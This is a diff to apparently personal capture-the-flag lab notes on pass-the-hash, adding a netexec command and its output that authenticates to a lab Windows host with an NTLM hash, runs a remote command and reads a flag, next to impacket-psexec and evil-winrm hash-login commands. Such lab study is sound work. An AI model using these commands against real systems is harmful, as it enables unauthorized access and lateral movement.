@@ -29,6 +29,13 @@ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660
 Adding things such as --local-auth or -x to execute commands will also work with this command. For example:
 `netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`
 
+```bash
+└─$ netexec smb 10.129.204.23 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x 'type C:\pth.txt'
+SMB         10.129.204.23   445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
+SMB         10.129.204.23   445    MS01             [+] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+SMB         10.129.204.23   445    MS01             [+] Executed command via wmiexec
+SMB         10.129.204.23   445    MS01             G3t_4CCE$$_V1@_PTH
+```
 #### Pass the Hash with evil-winrm
 `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`
 
